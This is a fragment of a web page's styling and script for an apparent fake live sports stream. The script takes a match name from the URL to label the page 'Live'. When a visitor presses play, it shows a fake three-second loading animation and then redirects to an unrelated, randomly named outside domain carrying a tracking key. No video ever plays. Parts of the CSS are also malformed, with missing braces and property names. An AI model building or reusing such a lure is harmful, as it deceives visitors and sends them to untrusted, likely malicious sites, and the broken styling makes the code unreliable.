  /* Modal radiant glow */
  .modal {
    position: relative;
    width: 940px;
    max-width: 95%;
    aspect-ratio: 16/9;
    border-radius: 14px;
    overflow: hidden;
    background: #000;
    box-shadow:

      0 0 30px var(--blue-glow-2),
      0 0 45px var(--white-glow);
    transition: box-shadow .4s ease;

  .modal:hover {

      0 0 18px rgba(0,191,255,0.28),
      0 0 34px rgba(173,216,230,0.43),
      0 0 60px rgba(255,255,255,0.18);
  }

  .modal .hover-tint {
    position: absolute;
    inset: 0;
    background: rgba(0,0,0,0);
    pointer-events: none;
    transition: background .22s ease;
    z-index: 4;
  }
  .modal:hover .hover-tint { background: rgba(0,0,0,0.12); }

  video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    background: #000;

  .play-btn {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90px;
    height: 90px;
    border-radius: 50%;
    background: rgba(255,0,0,0.92);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 6;
    box-shadow: 0 0 15px rgba(255,0,0,0.6);
    animation: playPulse 1.8s infinite;
    transition: opacity .4s ease, transform .18s ease;
    opacity: 1;
  }
  .play-btn:hover { transform: translate(-50%, -50%) scale(1.08); }
  .play-btn.fade-out { opacity: 0; pointer-events: none; }
  .play-btn::before {
    content: "";
    width: 0; height: 0;
    border-left: 25px solid #fff;
    border-top: 15px solid transparent;
    border-bottom: 15px solid transparent;
    margin-left: 5px;
  }
  @keyframes playPulse {
    0% { box-shadow: 0 0 12px rgba(255,0,0,0.5); }
    50% { box-shadow: 0 0 28px rgba(255,0,0,0.95); }
    100% { box-shadow: 0 0 12px rgba(255,0,0,0.5); }
  }

  .loader {
    position: absolute;
    width: 72px;
    height: 72px;
    border-radius: 50%;
    border: 7px solid rgba(255,255,255,0.16);
    border-top: 7px solid #4cc9f0;
    top: 50%;
    left: 50%;
    transform: translate(-50%,-50%);
    display: none;
    z-index: 8;
    animation: spin 1s linear infinite;
  }
  @keyframes spin { 0%{transform:translate(-50%,-50%) rotate(0deg);} 100%{transform:translate(-50%,-50%) rotate(360deg);} }

  .loading-text {
    position: absolute;
    top: calc(50% + 56px);
    left: 50%;
    transform: translateX(-50%);
    font-size: 15px;
    color: #fff;
    opacity: .95;
    display: none;
    z-index: 8;
  }

  .shimmer {
    position: absolute;
    inset: 0;
    pointer-events: none;
    z-index: 5;
    display: none;
    overflow: hidden;
  }
  .shimmer::before {
    content: "";
    position: absolute;
    top: -40%;
    left: -25%;
    width: 50%;
    height: 180%;
    background: linear-gradient(120deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.06) 50%, rgba(255,255,255,0) 100%);
    transform: translateX(-30%);
    filter: blur(10px);
    animation: shimmerMove 1.8s linear infinite;
  }
  @keyframes shimmerMove {
    0%{ transform:translateX(-30%) rotate(12deg); opacity:0; }
    10%{ opacity:1; }
    90%{ opacity:1; }
    100%{ transform:translateX(130%) rotate(12deg); opacity:0; }
  }

  @media (max-width:768px){

<script>
(function(){
  const params = new URLSearchParams(window.location.search);
  const liveParam = params.get('m');
  const pageTitle = document.getElementById('pageTitle');
  const video = document.getElementById('liveVideo');
  const playBtn = document.getElementById('playButton');
  const loader = document.getElementById('loader');
  const loadingText = document.getElementById('loadingText');
  const shimmer = document.getElementById('shimmer');
  const watchBtn = document.getElementById('watchNowBtn');
  const modal = document.getElementById('videoModal');

  const redirectUrl = 'https://conservedaftconcede.com/snu7hp6dza?key=f44f1cf36a1878702ef1290ff81eeec8';
  const LOAD_DELAY_MS = 3000;

  if (liveParam){
    let matchTitle = decodeURIComponent(liveParam.replace(/\+/g,' '));
    matchTitle = matchTitle.replace(/\bvs\b/gi,'vs');
    pageTitle.textContent = matchTitle + ' Live';
    document.title = matchTitle + ' Live';
  }

  modal.addEventListener('mouseenter',()=>{ if(!video.hasAttribute('controls')) video.setAttribute('controls',''); });
  modal.addEventListener('mouseleave',()=>{ if(video.paused) video.removeAttribute('controls'); });

  function startRedirectSequence(){
    loader.style.display = 'block';
    loadingText.style.display = 'block';
    shimmer.style.display = 'block';
    playBtn.classList.add('fade-out');
    video.removeAttribute('controls');
    setTimeout(()=>{
      shimmer.style.transition='opacity .6s ease';
      loader.style.transition='opacity .6s ease';
      loadingText.style.transition='opacity .6s ease';
      shimmer.style.opacity='0';
      loader.style.opacity='0';
      loadingText.style.opacity='0';
      setTimeout(()=>{ window.location.href = redirectUrl; },900);
    },LOAD_DELAY_MS);
  }

  playBtn.addEventListener('click',startRedirectSequence);
  watchBtn.addEventListener('click',startRedirectSequence);

  playBtn.tabIndex=0;
  playBtn.addEventListener('keydown',e=>{
    if(e.key==='Enter'||e.key===' '){ e.preventDefault(); startRedirectSequence(); }
  });

  video.addEventListener('pause',()=>{ if(loader.style.display==='block') return; playBtn.classList.remove('fade-out'); });
  video.addEventListener('play',()=>{ playBtn.classList.add('fade-out'); });

  window.addEventListener('pageshow',()=>{
    loader.style.display='none';
    loadingText.style.display='none';
    shimmer.style.display='none';
    shimmer.style.opacity='1';
    loader.style.opacity='1';
    loadingText.style.opacity='1';
    playBtn.classList.remove('fade-out');
    video.pause();
    video.currentTime=0;
    video.removeAttribute('controls');
  });

  video.removeAttribute('controls');
})();
</script>
